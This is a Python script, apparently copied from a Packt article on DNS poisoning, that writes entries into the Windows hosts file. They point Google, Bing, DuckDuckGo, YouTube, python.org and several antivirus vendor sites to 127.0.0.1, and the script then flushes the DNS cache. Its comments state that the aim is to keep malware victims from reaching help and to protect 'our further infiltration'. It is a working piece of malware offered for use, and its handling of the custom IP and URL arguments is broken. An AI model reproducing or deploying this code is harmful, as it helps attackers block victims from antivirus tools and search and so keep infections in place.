'''
    Script obtained from url https://hub.packtpub.com/phish-for-passwords-using-dns-poisoning/
    Courtesy of Savia Lobo.
'''

import subprocess
import sys
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-i", "--ip", required=False,
                    help="The ip address you want to redirected to")
parser.add_argument("-u", "--url", required=False,
                    help="Url to be redirected from")
args = parser.parse_args()

# URL to poison are default urls that users normally go to for help when their computer is attacked by malware
# To prevent the user from recovering, We make sure the user can't go access these sites to get information to
# be able to prevent our further infiltration. thats the goal.

poison_ip = '127.0.0.1'
urls_to_poison = [
    'www.google.com',
    'www.youtube.com',
    'www.python.org',
    'www.netflix.com',
    'www.mcafee.com',
    'www.avast.com',
    'www.norton.com',
    'www.bitdefender.com',
    'www.totalav.com',
    'www.avira.com',
    'www.kaspersky.com',
    'www.bing.com',
    'www.duckduckgo.com'
]

scriptFile = "C:\\Windows\\System32\\drivers\\etc\\hosts"


def main():
    command = 'ipconfig /flushdns'
    line = ''
    if not (args.url == None and args.ip == None):
        line = f'\n{args.ip}   {args.url}'

    try:
        for url in urls_to_poison:
            line = f'\n{poison_ip}  {url}'
            f = open(scriptFile, 'a')
            f.write(line)
            subprocess.Popen(command, shell=True,
                             stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            f.close()
    except (OSError) as e:
        print('--> Please run script as administrator')
        sys.exit(-1)


if __name__ == '__main__':
    main()
